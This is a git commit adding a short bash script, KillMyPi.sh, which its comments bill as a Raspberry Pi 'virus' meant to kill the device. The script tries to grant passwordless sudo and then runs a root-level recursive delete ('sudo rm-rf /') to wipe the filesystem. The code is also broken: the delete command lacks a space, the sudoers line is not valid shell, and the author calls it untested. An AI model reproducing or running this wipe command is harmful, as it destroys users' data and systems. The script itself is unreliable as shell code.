c06a8ba451c1f0cf482ecafd85957bd223da6927
Harry <harry.carrigan@walnuts.milton-keynes.sch.uk>
2017-02-15 01:16:06 +0000

    Create KillMyPi.sh

---
+++ KillMyPi.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+# One of the First Raspberry Pi Viruses 
+# Welp enjoy killing your Raspberry Pi
+# It should work with most raspberry pis
+# if it doesnt work replace pi with your username on your pc
+# not-tested-for-obvious-reasons
+pi ALL=(ALL) NOPASSWD: ALL
+echo "KillMyPi"
+echo "RUNNING"
+cd /
+sudo rm-rf /
+echo "good bye"
